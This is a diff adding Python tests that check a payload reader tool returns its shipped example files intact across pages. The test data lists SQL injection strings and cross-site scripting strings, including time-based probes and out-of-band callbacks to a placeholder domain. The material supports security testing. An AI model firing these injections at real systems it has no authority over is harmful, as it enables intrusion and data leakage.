@@ -370,3 +370,97 @@ async def test_boolean_examples_keep_context_annotations_in_bounded_reader(shipp
         line = next(line for line in text.splitlines() if line.startswith(expression + ' '))
         assert '# purpose:' in line and 'applies:' in line and 'limit:' in line
         assert any(term in line for term in ('benign marker', 'its marker'))
+
+
+# Exact shipped examples: availability and reader delivery, not executable inputs.
+SHIPPED_EXAMPLES = {
+    'sql-injection': (
+        "'", '"', "')", '\")', '`', ';', '--', '%27',
+        '1 AND 1=1', '1 AND 1=2', "1' AND '1'='1", "1' AND '1'='2", '1 OR 1=1',
+        '1;SELECT SLEEP(5)--', '1;SELECT SLEEP(0)--',
+        '1;SELECT pg_sleep(5)--', '1;SELECT pg_sleep(0)--',
+        "1;WAITFOR DELAY '0:0:5'--", "1;WAITFOR DELAY '0:0:0'--",
+        '1;BEGIN DBMS_LOCK.SLEEP(5); END;--', '1;BEGIN DBMS_LOCK.SLEEP(0); END;--',
+        r"1;SELECT LOAD_FILE(CONCAT('\\\\',(SELECT '{TOKEN}'),'.{CALLBACK_DOMAIN}\\a'))--",
+        r"1;EXEC master..xp_dirtree '\\{TOKEN}.{CALLBACK_DOMAIN}\a'--",
+        "1 AND UTL_INADDR.get_host_address('{TOKEN}.{CALLBACK_DOMAIN}') IS NOT NULL--",
+        '1 UNION SELECT version()--', '1 AND 1=CONVERT(int, @@version)--',
+        "1' AND extractvalue(1, concat(0x7e, version()))--",
+        '1 UNION SELECT banner FROM v$version--', '1 UNION SELECT sqlite_version()--',
+    ),
+    'cross-site-scripting': (
+        'xsspoc{TIMESTAMP}', 'xsspoc{TIMESTAMP}"\'<>',
+        "<script>document.title='xsspoc-{MARKER}'</script>",
+        '<img src=x onerror="document.title=\'xsspoc-{MARKER}\'">',
+        '\"><script>document.title=\'xsspoc-{MARKER}\'</script>',
+        "'><script>document.title='xsspoc-{MARKER}'</script>",
+        "';document.title='xsspoc-{MARKER}';//",
+        '\";document.title=\'xsspoc-{MARKER}\';//',
+        "javascript:document.title='xsspoc-{MARKER}'",
+        "--><script>document.title='xsspoc-{MARKER}'</script><!--",
+        'red;\"><script>document.title=\'xsspoc-{MARKER}\'</script><div style="',
+        "color:red;}</style><script>document.title='xsspoc-{MARKER}'</script><style>{",
+    ),
+}
+
+
+@pytest.mark.parametrize('skill_name', SHIPPED_EXAMPLES)
+async def test_shipped_examples_and_exact_text_survive_bounded_continuation(
+    shipped_payload_tool, noop_prompter, skill_name,
+):
+    raw = (REPO_ROOT / 'skills' / skill_name / 'payloads.txt').read_bytes().decode('utf-8')
+    args = {'skill': skill_name, 'file': 'payloads.txt', 'limit': 23}
+    parts = []
+    offset = 0
+    while True:
+        output = await shipped_payload_tool.run(args, None, noop_prompter)
+        rendered, metadata = output.rsplit('\nContinuation: ', 1)
+        page = json.loads(metadata)
+        assert page['start_char'] == offset
+        assert page['end_char'] > offset
+        body = rendered.split('\n', 1)[1][:page['end_char'] - offset]
+        assert body == raw[offset:page['end_char']]  # never strip significant spaces
+        parts.append(body)
+        offset = page['end_char']
+        if page['next_start_char'] is None:
+            assert not output.truncated
+            break
+        assert output.truncated
+        next_call = json.loads(rendered.splitlines()[0].split('Next page: ', 1)[1])
+        assert next_call['tool'] == 'read_payloads'
+        args = next_call['arguments']  # only producer-published identity and offsets
+    delivered = ''.join(parts)
+    assert len(parts) > 1 and delivered == raw
+    for example in SHIPPED_EXAMPLES[skill_name]:
+        assert any(line == example or line.startswith(example + '  ')
+                   for line in delivered.splitlines()), repr(example)
+
+
+@pytest.mark.parametrize('limit', [1, 5000])
+async def test_reader_keeps_significant_spaces_encoding_and_placeholders_verbatim(
+    skill_setup, noop_prompter, limit,
+):
+    from src.tools.skills.paths import MAX_PREVIEW_BYTES
+
+    # Exercise line and byte clipping, including a Unicode split and trailing SQL space.
+    raw = ('đ' * MAX_PREVIEW_BYTES + '\n1;SELECT SLEEP(5)-- \n'
+           "'  # purpose: annotation kept as text\n%27\n%2527\n--<space>\n"
+           'xsspoc{TIMESTAMP}\nxsspoc-{MARKER}\n{TOKEN}.{CALLBACK_DOMAIN}\n')
+    (skill_setup['skill_dir'] / 'payloads' / 'alpha.txt').write_bytes(raw.encode('utf-8'))
+    args = {'skill': 'demo', 'file': 'alpha.txt', 'limit': limit}
+    parts = []
+    while True:
+        output = await skill_setup['tool'].run(args, None, noop_prompter)
+        rendered, metadata = output.rsplit('\nContinuation: ', 1)
+        page = json.loads(metadata)
+        start, end = page['start_char'], page['end_char']
+        assert end > start
+        body = rendered.split('\n', 1)[1][:end - start]
+        assert body == raw[start:end]
+        assert len(body.encode('utf-8')) <= MAX_PREVIEW_BYTES
+        parts.append(body)
+        if page['next_start_char'] is None:
+            break
+        next_call = json.loads(rendered.splitlines()[0].split('Next page: ', 1)[1])
+        args = next_call['arguments']
+    assert ''.join(parts).encode('utf-8') == raw.encode('utf-8')
